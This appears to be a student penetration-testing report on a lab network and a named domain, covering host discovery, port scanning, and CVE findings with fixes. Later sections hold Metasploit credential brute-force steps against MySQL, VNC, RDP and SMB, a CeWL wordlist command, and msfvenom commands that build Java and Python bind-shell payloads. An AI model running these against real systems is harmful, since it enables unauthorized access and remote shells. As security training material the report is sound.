# Internal Network Penetraion Testing

## Table of Contents

- [Table of Contents](#Table-of-Contents)
- [Scope](#Scope)
 - [Host Discovery](#Host-Discovery)
- [Service Discovery and Port Scanning](#Service-Discovery-and-Port-Scanning)
  [Summary of findings](#Summary-of-Fings)
- [Vulnerability_Scanning](#Vulnerability_Scanning)
-  [Web Based Attack Surface](#Web-Based-Attack-Surface)
- [CVSS v3.0 Reference Table](#CVSS-v3.0-Reference-Table)
  ## Scope
 The scope of engagement comprises of an internal network 10.10.10.0/24 and a domain https://virtualinfosecafrica.com

  ## Host Discovery

**Host discovery** involves detecting which devices on a network are currently active or "live." This is typically the initial phase of network scanning and security evaluations, helping to identify the devices that are available for further examination. Once identified, these devices can be analyzed for vulnerabilities, services, or open ports.


     - Example Nmap command for host discovery:
       ```bash
       nmap -sn 10.10.10.0/24
       ```
       The `-sn` option disables port scanning and focuses solely on discovering live hosts.

### Why Host Discovery Matters:
- **Efficiency**: Host discovery allows for focusing on live hosts rather than scanning the entire network, saving time and resources.
- **Security Monitoring**: Helps network administrators identify unauthorized or rogue devices that could pose security risks.
- **Penetration Testing**: Essential for ethical hacking to determine which devices to target for vulnerability assessment.

In summary, host discovery is the process of identifying active devices on a network to facilitate further actions such as vulnerability scanning, service detection, or network management.

![Host Discovery](online_host.png)

A subdomain enumeration can be demonstrated using a tool like **sublist3r** with the domain provided in the scope.

![Sublist3r](DNSbrute.png)

 ## Service Discovery and Port Scanning

**Service discovery** and **port scanning** are essential components of network security assessments, vulnerability management, and penetration testing. They help determine what services are running on network devices and which ports are open, providing a basis for identifying potential vulnerabilities or misconfigurations.

### Reasons for Service Discovery and Port Scanning:

#### 1. **Identify Running Services on a Host**:
   - **Service Discovery**: This involves finding out which network services (e.g., HTTP, SSH, FTP, DNS) are operational on a host. Each service listens on a specific port (e.g., HTTP on port 80, SSH on port 22), and understanding these services is crucial for assessing how a host interacts with the network.
     - **Example**: A web server may run an HTTP service on ports 80 or 443, while a MySQL database service might operate on port 3306.

   - **Port Scanning**: This technique checks for open, closed, or filtered ports on a host. Open ports suggest that a service is available and potentially reachable. By scanning ports, you can identify which services are actively accepting connections.
     - **Example**: A scan revealing open ports 22 (SSH) and 80 (HTTP) suggests that the host is running an SSH service and a web server.

#### 2. **Assess Security and Vulnerabilities**:
   - **Detect Vulnerabilities**: Some services might be outdated or misconfigured, presenting security risks. Identifying the version of a service running on a port (through service discovery) helps in assessing if known vulnerabilities are present.
     - **Example**: Finding an old version of SMB running on a server might indicate susceptibility to the EternalBlue exploit (MS17-010).

   - **Misconfigurations**: Port scanning can uncover misconfigurations such as unnecessary open ports or services that should not be accessible externally, which can pose security risks.
     - **Example**: An exposed database or RDP service on the internet, instead of being restricted to internal access, represents a significant security vulnerability.

#### 3. **Network Inventory and Monitoring**:
   - **Mapping the Network**: Service discovery and port scanning offer a snapshot of available services and ports on network devices, which helps in maintaining an accurate network inventory.
   - **Monitoring Network Changes**: Regular scans allow administrators to detect unauthorized services or newly opened ports, indicating potential security breaches or network changes.

#### 4. **Penetration Testing and Ethical Hacking**:
   - **Target Identification**: For penetration testing, these methods identify potential targets by revealing active services and open ports, necessary for exploiting vulnerabilities.
     - **Example**: If an FTP service is detected, a penetration tester might try to exploit default credentials or specific vulnerabilities associated with FTP.

   - **Attack Surface Analysis**: Knowing which services are exposed helps map the attack surface and assess how to gain unauthorized access.

#### 5. **Troubleshooting and Network Diagnostics**:
   - **Ensuring Services are Available**: Port scanning helps confirm that services are functioning as expected and that necessary ports are open. If a service is down, a port scan might show the port as closed, signaling a potential issue with the service or firewall configuration.
   - **Detecting Firewalls and Filtering**: These techniques help diagnose if firewalls or security devices are blocking traffic. Ports appearing as "filtered" suggest that a firewall is preventing access.

### Importance of These Steps:

#### 1. **Security Posture Assessment**:
   - Without service discovery and port scanning, understanding the security posture of a host or network is incomplete. These steps reveal exposed services and accessible ports that could be exploited by attackers.

#### 2. **Reducing the Attack Surface**:
   - Identifying unnecessary or vulnerable services and open ports allows administrators to secure or disable them, reducing the attack surface and minimizing unauthorized access opportunities.

#### 3. **Compliance and Best Practices**:
   - Many security frameworks and standards (e.g., PCI-DSS, HIPAA) mandate regular network scanning, vulnerability assessments, and service hardening. Service discovery and port scanning are crucial for meeting these requirements and ensuring a secure environment.

#### 4. **Proactive Defense**:
   - Since attackers use port scans and service discovery during their reconnaissance, performing these scans regularly helps administrators identify and address weaknesses before an attacker can exploit them, enhancing proactive defenses.
     



![Service Discovery](nmap_service_scan.png)
## Summary of findings
| **Findings**                                                                                  | **Severity**                  |
|---------------------------------------------------------------------------------------------------|-------------------------------|
| Insufficient Fix in Apache HTTP Server Allows Path Traversal and Potential Remote Code Execution | Not specified                 |
| MySQL Server Vulnerabilities Could Lead to Denial of Service                                      | CVSS 4.4 (CVE-2020-14867), CVSS 4.9 (CVE-2020-14812) |
| Local Privilege Escalation Vulnerabilities in RealVNC VNC Server                                  | Not specified                 |
| RDP Vulnerabilities in Microsoft Windows Expose Sensitive Information and Cause Denial of Service | Not specified                 |
| Exim Vulnerabilities Enable SMTP Smuggling and Remote Code Execution                               | Not specified                 |
| BSD-based Telnet Clients Vulnerable to Remote Environment Variable Exposure                        | Not specified                 |
| Critical Vulnerabilities in Samba Allow Remote Code Execution and Bypass Restrictions              | Not specified                 |
| Local Privilege Escalation and Out-of-Bounds Access Vulnerabilities in UltraVNC                   | Not specified                 |
| Incomplete Cleanup Vulnerability in Apache Tomcat Could Lead to Denial of Service                 | Not specified                 |
| Python Code Injection Vulnerability in Login Flow Can Be Exploited                                 | Not specified                 |


### 1. CVE-2021-42013 & CVE-2021-41773
**Headline:** Insufficient Fix in Apache HTTP Server Allows Path Traversal and Potential Remote Code Execution 
 ---
**CVE-2021-42013**  
It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

**CVE-2021-41773**  
A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.



**Solution:** Upgrade to Apache HTTP Server version 2.4.51 or later to mitigate the vulnerabilities.

---

### 2. CVE-2020-14867 & CVE-2020-14812
**Headline:** MySQL Server Vulnerabilities Could Lead to Denial of Service  
---
**CVE-2020-14867**  
Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: DDL). Supported versions that are affected are 5.6.49 and prior, 5.7.31 and prior, and 8.0.21 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.4 (Availability impacts).

**CVE-2020-14812**  
Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: Locking). Supported versions that are affected are 5.6.49 and prior, 5.7.31 and prior, and 8.0.21 and prior. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.9 (Availability impacts).

---
**Solution:** Upgrade to MySQL Server version 5.6.50, 5.7.32, or 8.0.22 or later to address these vulnerabilities.

---

### 3. CVE-2022-41975 & CVE-2022-27502
**Headline:** Local Privilege Escalation Vulnerabilities in RealVNC VNC Server  

**CVE-2022-41975**  
RealVNC VNC Server before 6.11.0 and VNC Viewer before 6.22.826 on Windows allow local privilege escalation via MSI installer Repair mode.

**CVE-2022-27502**  
RealVNC VNC Server 6.9.0 through 5.1.0 for Windows allows local privilege escalation because an installer repair operation executes %TEMP% files as SYSTEM.

**Solution:** Update to RealVNC VNC Server version 6.11.0 or later for CVE-2022-41975, and version 6.9.1 or later for CVE-2022-27502.

---

### 4. CVE-2014-0296 & CVE-2012-0152
**Headline:** RDP Vulnerabilities in Microsoft Windows Expose Sensitive Information and Cause Denial of Service  
**CVE-2014-0296**  
The Remote Desktop Protocol (RDP) implementation in Microsoft Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 does not properly encrypt sessions, which makes it easier for man-in-the-middle attackers to obtain sensitive information by sniffing the network or modify session content by sending crafted RDP packets, aka "RDP MAC Vulnerability."

**CVE-2012-0152**  
The Remote Desktop Protocol (RDP) service in Microsoft Windows Server 2008 R2 and R2 SP1 and Windows 7 Gold and SP1 allows remote attackers to cause a denial of service (application hang) via a series of crafted packets, aka "Terminal Server Denial of Service Vulnerability."

---

**Solution:** Apply the latest security updates for Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012.

---

### 5. CVE-2023-51766 & CVE-2023-42116
**Headline:** Exim Vulnerabilities Enable SMTP Smuggling and Remote Code Execution
**CVE-2023-51766**  
Exim before 4.97.1 allows SMTP smuggling in certain PIPELINING/CHUNKING configurations. Remote attackers can use a published exploitation technique to inject e-mail messages with a spoofed MAIL FROM address, allowing bypass of an SPF protection mechanism.

**CVE-2023-42116**  
Exim SMTP Challenge Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exim. Authentication is not required to exploit this vulnerability.

---
  
**Solution:** Upgrade to Exim version 4.97.1 or later to resolve these vulnerabilities.

---

### 6. CVE-2005-0488
**Headline:** BSD-based Telnet Clients Vulnerable to Remote Environment Variable Exposure  
**CVE-2005-0488**  
Certain BSD-based Telnet clients, including those used on Solaris and SuSE Linux, allow remote malicious Telnet servers to read sensitive environment variables via the NEW-ENVIRON option with a SEND ENV_USERVAR command.

---

**Solution:** Disable the NEW-ENVIRON option in affected Telnet clients to mitigate this vulnerability.

---

### 7. CVE-2015-0240, CVE-2009-2813, & CVE-2007-2407
**Headline:** Critical Vulnerabilities in Samba Allow Remote Code Execution and Bypass Restrictions  
**CVE-2009-2813**  
Samba 3.4 before 3.4.2, 3.3 before 3.3.8, 3.2 before 3.2.15, and 3.0.12 through 3.0.36 does not properly handle errors in resolving pathnames, allowing remote authenticated users to bypass intended sharing restrictions.

**CVE-2007-2407**  
The Samba server on Apple Mac OS X 10.3.9 and 10.4.10 does not enforce disk quotas after dropping privileges, allowing remote authenticated users to use disk space in excess of quota.

---

**Solution:** Upgrade to Samba versions 3.6.25, 4.0.25, 4.1.17, and 4.2.0rc5 or later to fix these issues.

---

### 8. CVE-2022-24750 & CVE-2019-8280
**Headline:** Local Privilege Escalation and Out-of-Bounds Access Vulnerabilities in UltraVNC  
**CVE-2022-24750**  
UltraVNC is a free and open-source remote PC access software. A vulnerability has been found in versions prior to 1.3.8.0 allowing a local authenticated user to achieve local privilege escalation on a vulnerable system.
**CVE-2019-8280**  
UltraVNC revision 1203 has an out-of-bounds access vulnerability in the VNC client inside RAW decoder, which can potentially result in code execution. This vulnerability has been fixed in revision 1204.

---
**Solution:** Update to UltraVNC version 1.3.8.1 or later to mitigate CVE-2022-24750, and version 1204 or later for CVE-2019-8280.

---

### 9. CVE-2023-42794 & CVE-2023-41080
**Headline:** Incomplete Cleanup Vulnerability in Apache Tomcat Could Lead to Denial of Service  
**CVE-2023-42794**  
Incomplete Cleanup vulnerability in Apache Tomcat. The internal fork of Commons FileUpload exposed a potential denial of service on Windows if a web application opened a stream for an uploaded file but failed to close the stream.

**CVE-2023-41080**  
UCVE-2023-42794 Incomplete Cleanup vulnerability in Apache Tomcat. Users are recommended to upgrade to version 9.0.81 onwards or 8.5.94 onwards to fix the issue.

---


**Solution:** Upgrade to Apache Tomcat version 9.0.81 or 8.5.94 or later to fix these vulnerabilities.

---

### 10. CVE-2024-6891
**Headline:** Python Code Injection Vulnerability in Login Flow Can Be Exploited  
**CVE-2024-6891**  
Attackers with a valid username and password can exploit a Python code injection vulnerability during the natural login flow.
**Solution:** Review and sanitize user input in the login process, and apply relevant patches as they become available.




  ## Vulnerability Scanning
  
Using my protocol specific file I created under service discovery, I scannned for vulnerabilities with the *Metasploit Auxilliary Module*

## Scanning for login vulnerabilities for the following services.

1. ### mysql:
steps:
> 1. msfconsole
>
> 2. search and use mysql_login
>
> 3. info
>
> 4. set USER_FILE userlist.txt
>
> 5. set PASS_FILE passlist.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**


![alt text](my_sqllogin_pc_45.png.png)
![alt text](my_sqllogin_pc_5.png)



2. ### vnc:
steps:
> 1. msfconsole
>
> 2. search and use vnc_login
>
> 3. info
>
> 4. set USER_FILE userlist1.txt
>
> 5. set PASS_FILE passlist1.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**

![alt text](vnc_login.png)  


3. ### rdp:
steps:
> 1. msfconsole
>
> 2. search and use rdp_login
>
> 3. info
>
> 7. **run**

![alt text](rdp_login.png)

4. ### smb:
steps:
> 1. msfconsole
>
> 2. search and use smb_login
>
> 3. info
>
> 4. set USER_FILE userlist2.txt
>
> 5. set PASS_FILE passlist2.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**


![alt text](smb_login.png)


Generating custom wordlist using  **Cewl** from the domain given.

syntax used:
> cewl https://virtualinfosecafrica.com -w /home/leroymenorah/Desktop/Pent_assignment/cewl_wordlist.txt

![alt text](cewl_wordlist.png)


 # Web-Based Attack Surfaces


EyeWitness is a utility designed for capturing screenshots of web applications, launching RDP services, and opening VNC servers. It is particularly useful for identifying and reporting vulnerabilities, making it a valuable tool during reconnaissance and vulnerability assessments. Here is an example of how to use EyeWitness:

> eyewitness --timeout 15 -f urls.txt

![eyewitness](eyewitness.png)


![google screenshot](https.google.com)





## Generating Payloads


To generate a payload that can trigger a **TCP bind shell** with **msfvenom**, assuming the host is 10.10.10.55 and runs on an Apache Tomcat web server(Java based), we use the **syntax command**:

> msfvenom -p java/shell/bind_tcp LPORT=9005 RHOSTS=10.10.10.55 -f war -o payload.war

![alt text](payload1.png)




To generate a payload that can execute **base64** with **msfvenom**, assuming the host is 10.10.10.55 and runs a Python server, we use the **syntax command**:

> msfvenom -p python/shell_bind_tcp  LPORT=9005 RHOSTS=10.10.10.55 -f python -o payload.py


![alt text](payload2.png)






  ## CVSS v3.0 Reference Table 
  | Qualitative Rating | CVSS Score |
  |:-------------------:|:-----------:|
  | None informational | N/A |
  | Low | 0.1-3.9|
  | Medium | 4.0-6.9|
  | High | 7.0-8.9|
  | Critical | 9.0-10.0 |
  
